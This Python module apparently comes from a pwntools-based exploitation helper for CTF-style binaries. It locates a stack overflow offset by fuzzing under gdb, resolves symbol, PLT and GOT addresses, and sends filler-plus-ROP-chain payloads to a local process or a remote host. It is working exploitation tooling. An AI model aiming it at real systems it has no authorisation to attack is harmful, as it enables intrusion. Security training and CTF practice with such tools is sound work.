import argparse
import enum
import threading
import typing

from pwn import ELF, ROP, remote, process
from pwnlib import gdb
from pwnlib.context import context
from pwnlib.util.cyclic import cyclic, cyclic_find
from loguru import logger

from abstract.pwntarget import PwnTarget


class Mode(enum.Enum):
    Local = enum.auto()
    Remote = enum.auto()


class Method(enum.Enum):
    SymbolTable = enum.auto()
    PLT = enum.auto()
    GOT = enum.auto()


class Target:
    def __init__(self, pwn_target: typing.Type[PwnTarget]):
        context.log_level = 'error'
        logger.info('Parsing command line arguments:')
        args = self._config()
        self._sample = ELF(args.sample)
        self._libc = ELF(args.libc)
        self._libc_preload = args.libc_env
        self._rop = ROP(args.sample)
        self._pwn_target = pwn_target
        self._offset = args.offset
        try:
            self._main = self._sample.symbols[args.main_function_name]
            logger.info(f"Main address: {hex(self._main)}")
        except KeyError:
            logger.critical(f"Failed to find entry point '{args.main_function_name}' for the target file")
            exit(0)
        self._thread_timeout = 5

        if args.target.find(":") < 0:
            if not self._offset:
                logger.info("No offset value found. Searching for the offset...")
                self._find_offset(args.target, args.offset_max)
            logger.info('Using LOCAL mode')
            env = {}
            if self._libc_preload:
                logger.info('Setting up custom libc')
                env["LD_PRELOAD"] = self._libc.path
            self._process = process([args.target])
            self._mode = Mode.Local
        else:
            if not self._offset:
                logger.critical("For REMOTE target offset must be specified")
                exit(0)
            logger.info('Using REMOTE mode')
            ip, port = args.target.split(":")
            self._process = remote(ip, int(port))

    @property
    def main(self) -> int:
        return self._main

    @property
    def process(self):
        return self._process

    @property
    def sample(self) -> ELF:
        return self._sample

    @property
    def libc(self) -> ELF:
        return self._libc

    @property
    def rop(self) -> ROP:
        return self._rop

    @property
    def offset(self) -> int:
        return self._offset

    def create_payload(self, rop_chain: bytes) -> bytes:
        return self.filler + rop_chain

    @property
    def filler(self):
        return b'A' * self._offset

    def look_for_function(self, function_name: typing.Union[typing.AnyStr, typing.List[typing.AnyStr]],
                          method: Method = Method.SymbolTable):
        logger.info(f"Looking for function address. Possible functions: {function_name}")
        address = None
        if method == Method.SymbolTable:
            logger.info("Checking out the symbol table")
            container = self._sample.symbols
        elif method == Method.PLT:
            logger.info("Checking out the procedure linkage table")
            container = self._sample.plt
        elif method == Method.GOT:
            logger.info("Checking out the global offset table")
            container = self._sample.got
        else:
            logger.critical(f"Method not supported")
            return address

        if not isinstance(function_name, list):
            function_name = (function_name, )

        for name in function_name:
            try:
                address = container[name]
                logger.success(f"Found: {name}@{hex(address)}")
                return name, address
            except KeyError:
                pass
        logger.critical(f"No address for any functions provided found")
        return None

    @staticmethod
    def _config():
        parser = argparse.ArgumentParser()
        parser.add_argument("--target", '-t', required=True, type=str)
        parser.add_argument("--sample", '-s', required=True, type=str)
        parser.add_argument("--libc", '-l', type=str, default='/lib/x86_64-linux-gnu/libc.so.6')
        parser.add_argument("--libc-env", '-L', action='store_true')
        parser.add_argument("--offset", "-o", type=int)
        parser.add_argument("--offset-max", "-O", type=int, default=0x800)
        parser.add_argument("--main-function-name", "-M", type=str, default='main')
        return parser.parse_args()

    def run_main(self, payload: bytes):
        self._pwn_target.main(self._process)
        self._process.send_raw(payload)
        self._pwn_target.input_handler(self._process, payload)

    def _find_offset(self, target: str, max_offset: int):
        def _signal_handler(event):
            logger.success(f'Stop signal caught')
            if event.stop_signal == 'SIGSEGV':
                logger.info('Received SIGSEGV')
                result = debugger.execute('x/wx $rsp', to_string=True)
                value = int(result.split('\t')[1].strip(), base=16)
                self._offset = cyclic_find(value)
                logger.success(f'Found offset: {self._offset}')
                sighandler_done.set()
            else:
                logger.error(f'Received another signal: {event.stop_signal}')

        logger.info('Looking for the offset')
        logger.info('Starting up the debugger...')
        proc = gdb.debug(target, api=True)
        debugger = proc.gdb
        debugger.continue_nowait()
        logger.info(f'Generating payload, size={hex(max_offset)}')
        payload = cyclic(max_offset)
        sighandler_done = threading.Event()
        logger.info(f'Setting up signal callback')
        debugger.events.stop.connect(_signal_handler)
        logger.info(f'Running main...')
        self._pwn_target.main(proc)
        proc.send_raw(payload)
        if not sighandler_done.wait(timeout=self._thread_timeout):
            logger.critical("Failed to trigger overflow")
        logger.info("Cleaning up gdb")
        debugger.execute('c')
        proc.kill()
        proc.close()
        debugger.quit()
        if not self._offset:
            exit(0)
